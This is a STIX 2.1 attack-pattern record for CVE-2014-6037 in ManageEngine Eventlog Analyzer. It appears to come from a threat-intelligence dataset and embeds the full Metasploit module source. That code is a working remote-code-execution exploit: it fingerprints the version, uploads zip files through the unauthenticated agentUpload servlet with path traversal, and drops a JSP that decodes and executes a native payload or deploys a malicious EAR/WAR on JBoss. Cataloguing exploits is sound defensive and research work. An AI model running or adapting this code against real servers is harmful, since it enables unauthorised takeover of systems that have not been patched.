{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7910f3ee-f27d-42ed-bf52-ef5da8d656d3",
    "created": "2024-08-14T17:11:29.777447Z",
    "modified": "2024-08-14T17:11:29.777451Z",
    "name": "ManageEngine Eventlog Analyzer Arbitrary File Upload",
    "description": " This module exploits a file upload vulnerability in ManageEngine Eventlog Analyzer. The vulnerability exists in the agentUpload servlet which accepts unauthenticated file uploads and handles zip file contents in an insecure way. By combining both weaknesses a remote attacker can achieve remote code execution. This module has been tested successfully on versions v7.0 - v9.9 b9002 in Windows and Linux. Versions between 7.0 and < 8.1 are only exploitable via EAR deployment in the JBoss server while versions 8.1+ are only exploitable via a JSP upload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/eventlog_file_upload.rb",
            "external_id": "eventlog_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6037"
        },
        {
            "source_name": "reference",
            "url": "https://www.mogwaisecurity.de/advisories/MSA-2014-01.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Aug/86"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'ManageEngine Eventlog Analyzer Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a file upload vulnerability in ManageEngine Eventlog Analyzer.\n        The vulnerability exists in the agentUpload servlet which accepts unauthenticated\n        file uploads and handles zip file contents in an insecure way. By combining both\n        weaknesses a remote attacker can achieve remote code execution. This module has been\n        tested successfully on versions v7.0 - v9.9 b9002 in Windows and Linux. Versions\n        between 7.0 and < 8.1 are only exploitable via EAR deployment in the JBoss server,\n        while versions 8.1+ are only exploitable via a JSP upload.\n      },\n      'Author'       =>\n        [\n          'h0ng10',                              # Vulnerability discovery\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2014-6037' ],\n          [ 'OSVDB', '110642' ],\n          [ 'URL', 'https://www.mogwaisecurity.de/advisories/MSA-2014-01.txt' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Aug/86' ]\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 5 },\n      'Privileged'  => false,            # Privileged on Windows but not on Linux targets\n      'Platform'    => %w{ java linux win },\n      'Targets'     =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Eventlog Analyzer v7.0 - v8.0 / Java universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n              'WfsDelay' => 30\n            }\n          ],\n          [ 'Eventlog Analyzer v8.1 - v9.9 b9002 / Windows',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Eventlog Analyzer v8.1 - v9.9 b9002 / Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-08-31'))\n\n    register_options(\n      [\n        Opt::RPORT(8400),\n        OptInt.new('SLEEP',\n          [true, 'Seconds to sleep while we wait for EAR deployment (Java target only)', 15]),\n      ])\n  end\n\n\n  def get_version\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"event/index3.do\"),\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200\n      if res.body =~ /ManageEngine EventLog Analyzer ([0-9]{1})/\n        return $1\n      end\n    end\n\n    return \"0\"\n  end\n\n\n  def check\n    version = get_version\n    if version >= \"7\" and version <= \"9\"\n      # version 7 to < 8.1 detection\n      res = send_request_cgi({\n        'uri'    => normalize_uri(\"event/agentUpload\"),\n        'method' => 'GET'\n      })\n      if res and res.code == 405\n        return Exploit::CheckCode::Appears\n      end\n\n      # version 8.1+ detection\n      res = send_request_cgi({\n        'uri'    => normalize_uri(\"agentUpload\"),\n        'method' => 'GET'\n      })\n      if res and res.code == 405 and version == 8\n        return Exploit::CheckCode::Appears\n      else\n        # We can't be sure that it is vulnerable in version 9\n        return Exploit::CheckCode::Detected\n      end\n\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def create_zip_and_upload(payload, target_path, is_payload = true)\n    # Zipping with CM_STORE to avoid errors decompressing the zip\n    # in the Java vulnerable application\n    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    zip.add_file(target_path, payload)\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(zip.pack, \"application/zip\", 'binary', \"form-data; name=\\\"#{Rex::Text.rand_text_alpha(4+rand(4))}\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(4+rand(4))}.zip\\\"\")\n\n    data = post_data.to_s\n\n    if is_payload\n      print_status(\"Uploading payload...\")\n    end\n    res = send_request_cgi({\n      'uri'    => (@my_target == targets[1] ? normalize_uri(\"/event/agentUpload\") : normalize_uri(\"agentUpload\")),\n      'method' => 'POST',\n      'data'   => data,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    if res and res.code == 200 and res.body.empty?\n      if is_payload\n        print_good(\"Payload uploaded successfully\")\n      end\n      register_files_for_cleanup(target_path.gsub(\"../../\", \"../\"))\n      return true\n    else\n      return false\n    end\n  end\n\n\n  def pick_target\n    return target if target.name != 'Automatic'\n\n    print_status(\"Determining target\")\n\n    version = get_version\n\n    if version == \"7\"\n      return targets[1]\n    end\n\n    os_finder_payload = %Q{<html><body><%out.println(System.getProperty(\"os.name\"));%></body><html>}\n    jsp_name = \"#{rand_text_alphanumeric(4+rand(32-4))}.jsp\"\n    target_dir = \"../../webapps/event/\"\n    if not create_zip_and_upload(os_finder_payload, target_dir + jsp_name, false)\n      if version == \"8\"\n        # Versions < 8.1 do not have a Java compiler, but can be exploited via the EAR method\n        return targets[1]\n      end\n      return nil\n    end\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(jsp_name),\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200\n      if res.body.to_s =~ /Windows/\n        return targets[2]\n      else\n        # assuming Linux\n        return targets[3]\n      end\n    end\n\n    return nil\n  end\n\n\n  def generate_jsp_payload\n    opts = {:arch => @my_target.arch, :platform => @my_target.platform}\n    payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)\n    exe = generate_payload_exe(opts)\n    base64_exe = Rex::Text.encode_base64(exe)\n\n    native_payload_name = rand_text_alpha(rand(6)+3)\n    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'\n\n    var_raw     = rand_text_alpha(rand(8) + 3)\n    var_ostream = rand_text_alpha(rand(8) + 3)\n    var_buf     = rand_text_alpha(rand(8) + 3)\n    var_decoder = rand_text_alpha(rand(8) + 3)\n    var_tmp     = rand_text_alpha(rand(8) + 3)\n    var_path    = rand_text_alpha(rand(8) + 3)\n    var_proc2   = rand_text_alpha(rand(8) + 3)\n\n    if @my_target['Platform'] == 'linux'\n      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      chmod = %Q|\n      Process #{var_proc1} = Runtime.getRuntime().exec(\"chmod 777 \" + #{var_path});\n      Thread.sleep(200);\n      |\n\n      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      cleanup = %Q|\n      Thread.sleep(200);\n      Process #{var_proc3} = Runtime.getRuntime().exec(\"rm \" + #{var_path});\n      |\n    else\n      chmod = ''\n      cleanup = ''\n    end\n\n    jsp = %Q|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    try {\n      String #{var_buf} = \"#{base64_exe}\";\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{native_payload_name}\", \"#{ext}\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      #{chmod}\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n      #{cleanup}\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp = jsp.gsub(/\\n/, '')\n    jsp = jsp.gsub(/\\t/, '')\n    jsp = jsp.gsub(/\\x0d\\x0a/, \"\")\n    jsp = jsp.gsub(/\\x0a/, \"\")\n\n    return jsp\n  end\n\n\n  def exploit_native\n    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.\n    # Fail if this is the case and ask the user to select an appropriate payload.\n    if @my_target['Platform'] == 'linux' and payload_instance.name =~ /Windows/\n      fail_with(Failure::BadConfig, \"#{peer} - Select a compatible payload for this Linux target.\")\n    end\n\n    jsp_name = \"#{rand_text_alphanumeric(4+rand(32-4))}.jsp\"\n    target_dir = \"../../webapps/event/\"\n\n    jsp_payload = generate_jsp_payload\n    if not create_zip_and_upload(jsp_payload, target_dir + jsp_name)\n      fail_with(Failure::Unknown, \"#{peer} - Payload upload failed\")\n    end\n\n    return jsp_name\n  end\n\n\n  def exploit_java\n    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.\n    # Fail if this is the case and ask the user to select an appropriate payload.\n    if @my_target['Platform'] == 'java' and not payload_instance.name =~ /Java/\n      fail_with(Failure::BadConfig, \"#{peer} - Select a compatible payload for this Java target.\")\n    end\n\n    target_dir = \"../../server/default/deploy/\"\n\n    # First we generate the WAR with the payload...\n    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    war_payload = payload.encoded_war({ :app_name => war_app_base })\n\n    # ... and then we create an EAR file that will contain it.\n    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    app_xml = %Q{<?xml version=\"1.0\" encoding=\"UTF-8\"?><application><display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name><module><web><web-uri>#{war_app_base + \".war\"}</web-uri><context-root>/#{ear_app_base}</context-root></web></module></application>}\n\n    # Zipping with CM_STORE to avoid errors while decompressing the zip\n    # in the Java vulnerable application\n    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    ear_file.add_file(war_app_base + \".war\", war_payload.to_s)\n    ear_file.add_file(\"META-INF/application.xml\", app_xml)\n    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + \".ear\"\n\n    if not create_zip_and_upload(ear_file.pack, target_dir + ear_file_name)\n      fail_with(Failure::Unknown, \"#{peer} - Payload upload failed\")\n    end\n\n    print_status(\"Waiting \" + datastore['SLEEP'].to_s + \" seconds for EAR deployment...\")\n    sleep(datastore['SLEEP'])\n    return normalize_uri(ear_app_base, war_app_base, rand_text_alphanumeric(4 + rand(32 - 4)))\n  end\n\n\n  def exploit\n    if datastore['SLEEP'] < 0\n      print_error(\"The SLEEP datastore option shouldn't be negative\")\n      return\n    end\n\n    @my_target = pick_target\n    if @my_target.nil?\n      print_error(\"Unable to select a target, we must bail.\")\n      return\n    else\n      print_status(\"Selected target #{@my_target.name}\")\n    end\n\n    if @my_target == targets[1]\n      exploit_path = exploit_java\n    else\n      exploit_path = exploit_native\n    end\n\n    print_status(\"Executing payload...\")\n    send_request_cgi({\n      'uri'    => normalize_uri(exploit_path),\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-31",
    "x_mitre_platforms": [
        "linux'"
    ]
}